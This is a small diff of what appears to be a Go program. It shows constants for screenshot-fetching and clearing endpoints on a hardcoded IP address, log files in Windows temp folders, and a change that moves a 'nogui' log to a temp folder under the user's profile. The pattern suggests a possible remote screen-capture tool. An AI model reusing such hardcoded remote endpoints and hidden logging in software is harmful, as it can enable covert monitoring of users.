@@ -37,7 +37,8 @@ const GETSCREEN string = "http://111.231.82.173:9000/getpic"
 const CLEARPIC = "http://111.231.82.173:9000/clearpic"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
-const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
+
+var NOGUILOG = get_current_user() + "\\temp\\nogui.txt"
 
 const TMVC = ":6000"
 const PMVC = ":5002"
